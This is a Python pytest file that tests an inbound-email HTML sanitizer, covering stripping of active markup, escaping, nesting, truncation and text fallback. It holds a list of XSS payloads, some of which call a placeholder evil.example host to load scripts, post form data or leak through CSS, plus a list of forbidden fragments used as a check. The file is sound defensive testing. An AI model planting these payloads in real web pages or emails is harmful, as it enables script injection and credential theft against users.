"""Inbound email HTML is hostile input (SECURITY.md section 6): nothing active may survive."""

from __future__ import annotations

import pytest

from apps.mailbox.sanitizer import MAX_BODY_CHARS, sanitize_email_bodies

FORBIDDEN_FRAGMENTS = (
    "<script",
    "<style",
    "<iframe",
    "<img",
    "<svg",
    "<form",
    "<object",
    "<embed",
    "<a ",
    "<link",
    "<meta",
    "<base",
    "onerror",
    "onload",
    "onclick",
    "javascript:",
    "href=",
    "src=",
    "style=",
)

PAYLOADS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)><circle/></svg>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<a href='javascript:alert(1)'>click</a>",
    '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
    "<p onclick='alert(1)' style='background:url(javascript:alert(1))'>hi</p>",
    "<form action=//evil.example><input name=pw></form>",
    "<object data=//evil.example/x.swf></object>",
    "<embed src=//evil.example/x.swf>",
    "<link rel=stylesheet href=//evil.example/x.css>",
    "<meta http-equiv=refresh content='0;url=//evil.example'>",
    "<base href=//evil.example/>",
    "<style>body{background:url(//evil.example/leak)}</style>",
    "<math><mtext></p><img src=x onerror=alert(1)></mtext></math>",
    "<div><!-- <script>alert(1)</script> --></div>",
    "<![CDATA[<script>alert(1)</script>]]>",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_no_active_markup_or_attribute_survives(payload: str) -> None:
    text, cleaned = sanitize_email_bodies(
        body_text="", body_html=f"<p>antes</p>{payload}<p>después</p>"
    )

    lowered = cleaned.casefold()
    for fragment in FORBIDDEN_FRAGMENTS:
        assert fragment not in lowered, (fragment, cleaned)
    assert "alert(1)" not in text
    assert "antes" in cleaned
    assert "después" in cleaned


def test_split_tag_obfuscation_is_left_as_inert_escaped_text() -> None:
    _, cleaned = sanitize_email_bodies(
        body_text="", body_html="<scr<script>ipt>alert(1)</scr</script>ipt>"
    )

    assert "<" not in cleaned.replace("&lt;", "")
    assert "<script" not in cleaned.casefold()


def test_content_of_blocked_elements_is_dropped_not_just_the_tags() -> None:
    text, cleaned = sanitize_email_bodies(
        body_text="",
        body_html="<p>ok</p><script>steal()</script><style>.x{}</style><p>fin</p>",
    )

    assert "steal" not in cleaned
    assert "steal" not in text
    assert ".x" not in cleaned


def test_nested_blocked_elements_stay_blocked_until_all_are_closed() -> None:
    _, cleaned = sanitize_email_bodies(
        body_text="",
        body_html="<svg><svg>one</svg>still hidden</svg><p>visible</p>",
    )

    assert "one" not in cleaned
    assert "still hidden" not in cleaned
    assert "visible" in cleaned


def test_unclosed_blocked_elements_swallow_everything_after_them() -> None:
    _, cleaned = sanitize_email_bodies(body_text="", body_html="<p>a</p><script>never closed")

    assert "never closed" not in cleaned


def test_a_stray_closing_tag_cannot_unblock_the_depth_counter() -> None:
    _, cleaned = sanitize_email_bodies(
        body_text="", body_html="</script></script><script>x()</script><p>ok</p>"
    )

    assert "x()" not in cleaned
    assert "ok" in cleaned


def test_text_that_looks_like_markup_is_escaped_not_interpreted() -> None:
    _, cleaned = sanitize_email_bodies(
        body_text="", body_html="<p>&lt;script&gt;alert(1)&lt;/script&gt; & 5 > 3</p>"
    )

    assert "<script" not in cleaned
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in cleaned
    assert "&amp;" in cleaned


def test_allowed_tags_are_rebuilt_without_any_attribute() -> None:
    _, cleaned = sanitize_email_bodies(
        body_text="",
        body_html='<DIV class="x" onclick="y()" style="z"><STRONG id="a">hola</STRONG><br/></DIV>',
    )

    assert cleaned == "<div><strong>hola</strong><br></div>"


def test_self_closing_blocked_tags_do_not_leave_the_parser_blocked() -> None:
    _, cleaned = sanitize_email_bodies(body_text="", body_html="<svg/><p>sigue</p>")

    assert "sigue" in cleaned


def test_the_plain_text_body_wins_but_html_is_the_fallback_for_the_readable_text() -> None:
    text, _ = sanitize_email_bodies(
        body_text="  texto   plano \r\n\r\n\r\n\r\nfin ", body_html="<p>html</p>"
    )
    assert text == "texto plano\n\nfin"

    fallback, _ = sanitize_email_bodies(body_text="", body_html="<p>uno</p><p>dos</p>")
    assert fallback == "uno\n\ndos"


def test_oversized_bodies_are_cut_to_the_limit() -> None:
    huge = "a" * (MAX_BODY_CHARS * 3)

    text, cleaned = sanitize_email_bodies(body_text=huge, body_html=f"<p>{huge}</p>")

    assert len(text) <= MAX_BODY_CHARS
    assert len(cleaned) <= MAX_BODY_CHARS


def test_empty_input_is_fine() -> None:
    assert sanitize_email_bodies(body_text="", body_html="") == ("", "")
